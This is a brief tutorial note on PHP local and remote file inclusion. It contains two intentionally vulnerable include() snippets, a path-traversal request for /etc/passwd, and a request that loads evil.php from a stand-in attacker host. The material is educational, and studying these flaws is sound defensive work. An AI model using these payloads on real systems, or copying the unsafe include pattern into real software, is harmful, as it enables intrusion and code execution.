### File Inclusion

there is 2 types

#### Local file inclusion (LFI)

is this case we can exposing or running files on the web server 

code ex :

```php
/**
* Get the filename from a GET input
* Example - http://example.com/?file=filename.php
*/
$file = $_GET['file'];

/**
* Unsafely include the file
* Example - filename.php
*/
include('directory/' . $file);
```

In the above example, an attacker could make the following request. It tricks the application into executing a PHP script such as a web shell that the attacker managed to upload to the web server.

```http
http://example.com/?file=../../etc/passwd
```

---

#### Remote file inclusion (RFI)

is this case we can  dynamically include external files or scripts.

```php
/**
* Get the filename from a GET input
* Example - http://example.com/?file=index.php
*/
$file = $_GET['file'];

/**
* Unsafely include the file
* Example - index.php
*/
include($file);
```

Using the above PHP script, an attacker could make the following HTTP request to trick the application into executing server-side malicious code, for example, a backdoor or a [webshell](https://www.acunetix.com/websitesecurity/introduction-web-shells/).

```http
http://example.com/?file=http://attacker.example.com/evil.php
```

